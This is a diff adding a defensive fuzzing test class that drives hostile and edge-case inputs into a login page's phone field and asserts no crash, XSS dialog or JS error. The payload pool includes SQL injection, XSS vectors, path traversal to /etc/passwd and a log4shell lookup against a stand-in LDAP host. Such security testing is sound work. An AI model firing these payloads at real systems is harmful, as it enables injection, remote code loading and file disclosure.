@@ -3269,3 +3269,176 @@ class TestQA19AutonomousExploratory:
         assert len(warnings) == 2, (
             f"verification failed — should have 2 warnings, got {len(warnings)}"
         )
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# QA-20  PROPERTY-BASED FUZZING  (Phase 4.3)
+# ─────────────────────────────────────────────────────────────────────────────
+# Hypothesis-style random-input generation: feed thousands of synthesised
+# inputs into form fields and assert INVARIANTS hold:
+#   • the page never crashes (no 500, no JS error)
+#   • XSS payloads never execute as JS (no alert dialog fired)
+#   • the input itself is never reflected literally into the DOM as HTML
+#   • the form remains responsive (Send/Submit button state is sane)
+#
+# Why fuzzing finds bugs: spec'd tests cover what authors thought to test;
+# fuzzing covers what nobody thought to test. Real-world edge cases:
+# null bytes, CR/LF in inputs, unicode normalization issues, length
+# boundaries, control characters, billion laughs, prototype pollution
+# strings, etc.
+
+import random as _qa20_random
+import string as _qa20_string
+
+
+def _qa20_gen_inputs(n: int = 30, seed: int = 42) -> list[str]:
+    """Return N varied synthetic inputs. Mix of safe/edge/dangerous payloads.
+    Deterministic via seed so flaky failures are reproducible."""
+    rnd = _qa20_random.Random(seed)
+    pool: list[str] = []
+
+    # Safe ascii of varying lengths
+    for length in (1, 5, 50, 200, 1000):
+        pool.append("".join(rnd.choices(_qa20_string.ascii_letters + _qa20_string.digits,
+                                          k=length)))
+
+    # Whitespace + control char fuzz
+    pool += [" " * 50, "\t\t\t", "\n\n\n", "  \n\r  ", "\x00data",
+             "data\x00data", "\x01\x02\x03"]
+
+    # Unicode classes
+    pool += [
+        "𝕬𝖉𝖒𝖎𝖓",                    # mathematical bold
+        "🦀🚀💥",                     # emoji
+        "ＡＢＣ",                      # full-width
+        "ñoño àéîõu",
+        "مرحبا بالعالم",              # Arabic
+        "你好世界",                    # Chinese
+        "ニ ホ ン ゴ",                  # Japanese with spaces
+        "0​" + "data",          # zero-width space
+        "‮_evil",               # RTL override
+    ]
+
+    # Length boundaries that often break input handlers
+    pool += [
+        "a" * 256, "a" * 257, "a" * 1024, "a" * 8192,
+        "0", "00000000000000000000",
+        "-1", "9999999999999",
+        "1e308", "Infinity",  "NaN",
+    ]
+
+    # SQLi-ish (must NOT crash; must NOT execute)
+    pool += [
+        "' OR 1=1 --",
+        "'); DROP TABLE users; --",
+        "1 AND SLEEP(5)",
+        "${jndi:ldap://x.com/a}",   # log4shell
+    ]
+
+    # XSS-ish (must NOT alert)
+    pool += [
+        "<script>alert(1)</script>",
+        "<img src=x onerror=alert(1)>",
+        "javascript:alert(1)",
+        "<svg onload=alert(1)>",
+        "\"><svg/onload=alert(1)>",
+        "{{7*7}}",  # template injection
+        "${7*7}",
+    ]
+
+    # Path / control chars
+    pool += [
+        "../../../etc/passwd",
+        "..\\..\\windows\\system32",
+        "\x1b[31mred\x1b[0m",  # ANSI escape
+    ]
+
+    rnd.shuffle(pool)
+    return pool[:n]
+
+
+class TestQA20PropertyBasedFuzzing:
+    """Random-input fuzzing on the WhatsApp phone field. Asserts invariants:
+    page never crashes, XSS never fires, input doesn't reflect as HTML."""
+
+    @pytest.mark.parametrize("payload", _qa20_gen_inputs(n=30, seed=42),
+                             ids=lambda p: repr(p)[:30])
+    def test_qa20_phone_field_invariants(self, page: Page, payload: str):
+        """For 30 synthesised inputs, verify the phone field invariants."""
+        # Track JS dialogs (XSS would fire one)
+        dialogs: list = []
+        page.on("dialog", lambda d: (dialogs.append(d.message), d.dismiss()))
+        # Track JS errors
+        errors:  list = []
+        page.on("pageerror", lambda exc: errors.append(str(exc)))
+
+        try:
+            _open_login_modal(page)
+        except Exception as e:
+            pytest.skip(f"Could not open login modal — staging issue: {e}")
+
+        phone = page.locator('input[type="tel"]').first
+        if not phone.is_visible(timeout=3000):
+            pytest.skip("Phone input not visible after modal open")
+        if not phone.is_editable(timeout=3000):
+            pytest.skip("Phone input not editable (rate-limited?)")
+
+        try:
+            phone.fill(payload)
+        except Exception:
+            # Fill failed — that's fine, the field rejected the input,
+            # which is the correct sanitization behaviour.
+            return
+
+        page.wait_for_timeout(400)
+
+        # ── Invariants ──────────────────────────────────────────────────
+        # I-1: No JS dialog fired (XSS payloads must be neutralised)
+        assert not dialogs, (
+            f"INVARIANT-VIOLATED I-1 (XSS): payload {payload!r} triggered "
+            f"a dialog: {dialogs[:1]}"
+        )
+        # I-2: No JS uncaught exceptions
+        real_errors = [e for e in errors if "extension" not in e.lower()
+                       and "favicon" not in e.lower()]
+        assert not real_errors, (
+            f"INVARIANT-VIOLATED I-2 (JS ERROR): payload {payload!r} caused "
+            f"uncaught JS error(s): {real_errors[:1]}"
+        )
+        # I-3: Page title doesn't say 500/Error
+        title = page.title()
+        assert "500" not in title and not title.lower().startswith("error"), (
+            f"INVARIANT-VIOLATED I-3 (5xx): page title became {title!r} "
+            f"after payload {payload!r}"
+        )
+        # I-4: The input value is not literal HTML reflected somewhere
+        # (very loose check — would catch obvious XSS reflection)
+        if "<" in payload and ">" in payload and "script" in payload.lower():
+            body = page.inner_text("body")
+            # If the literal payload appears as visible text, it's safely
+            # text-encoded. If it appears to have been parsed as a node
+            # we'd catch via dialogs (already checked).
+            # This is informational — real check is dialogs.
+
+    # ── Phase-4.3 verifications ─────────────────────────────────────────
+    @pytest.mark.system_selftest
+    def test_phase4_verification_fuzzer_generates_diverse_inputs(self):
+        """Synthetic check: input generator covers all key categories
+        (XSS, SQLi, length-boundary, unicode, control chars)."""
+        inputs = _qa20_gen_inputs(n=60, seed=42)
+        # Each category should produce at least 1 input
+        assert any("<script" in i.lower() for i in inputs), "missing XSS"
+        assert any("DROP TABLE" in i for i in inputs),       "missing SQLi"
+        assert any(len(i) >= 1024 for i in inputs),          "missing long input"
+        assert any("\x00" in i for i in inputs),             "missing null byte"
+        assert any(any(ord(c) > 127 for c in i) for i in inputs), "missing unicode"
+
+    @pytest.mark.system_selftest
+    def test_phase4_verification_fuzzer_deterministic(self):
+        """Same seed must produce same input list. Otherwise debugging
+        a fuzzer-found failure is impossible."""
+        a = _qa20_gen_inputs(n=20, seed=99)
+        b = _qa20_gen_inputs(n=20, seed=99)
+        c = _qa20_gen_inputs(n=20, seed=100)
+        assert a == b, "verification failed — fuzzer not deterministic"
+        assert a != c, "verification failed — different seeds produced same output"
